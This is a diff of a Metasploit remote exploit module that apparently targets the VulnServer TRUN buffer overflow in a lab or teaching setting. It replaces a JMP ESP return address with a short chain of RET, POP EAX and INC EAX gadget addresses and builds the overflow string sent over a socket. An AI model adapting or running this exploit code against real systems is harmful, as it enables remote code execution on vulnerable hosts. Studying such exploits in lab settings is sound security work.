@@ -39,9 +39,11 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
       'Platform'       => 'Win',	# Supporting what platforms are supported, e.g., win, linux, osx, unix, bsd.
       'Targets'        =>	#  targets for many exploits
       [
-        [ 'EssFuncDLL-JMPESP',
+        [ 'EssFuncDLL-RET',
           {
-            'jmpesp' => 0x62501023 # This will be available in [target['jmpesp']]
+            'retn' => 0x62501029,  # This will be available in [target['retn']]
+            'popeax' => 0x62501028,
+            'inceax' => 0x62501192
           }
         ]
       ],
@@ -58,13 +60,17 @@ class MetasploitModule < Msf::Exploit::Remote	# This is a remote exploit module 
     print_status("Connecting to target...")
     connect	# Connect to the target
 
-    if datastore['PAYLOADSTR'] && !datastore['PAYLOADSTR'].empty?
-      shellcode = payload.encoded.gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
-    else
-      shellcode = payload.encoded
-    end
+    # Payload Unused, This can be converted to one which just sends a shellcode file by uncommenting this and modifying
+    # the outbound string
+    # if datastore['PAYLOADSTR'] && !datastore['PAYLOADSTR'].empty?
+    #   shellcode = payload.encoded.gsub(/\\x([0-9a-fA-F]{2})/) { $1.to_i(16).chr }
+    # else
+    #   shellcode = payload.encoded
+    # end
 
-    outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
+    # If you want to control the binary string
+    #outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['retn']].pack('V') + shellcode + "\x90" * 990 # Create the malicious string that will be sent to the target
+    outbound = 'TRUN /.:/' + "A"*datastore['RETOFFSET'] + [target['retn']].pack('V') + [target['popeax']].pack('V') + [0xABCDABB9].pack('V') + [target['inceax']].pack('V') + "\x90" * 990 # Create the malicious string that will be sent to the target
 
     print_status("Sending Exploit")
     sock.put(outbound)	# Send the attacking payload
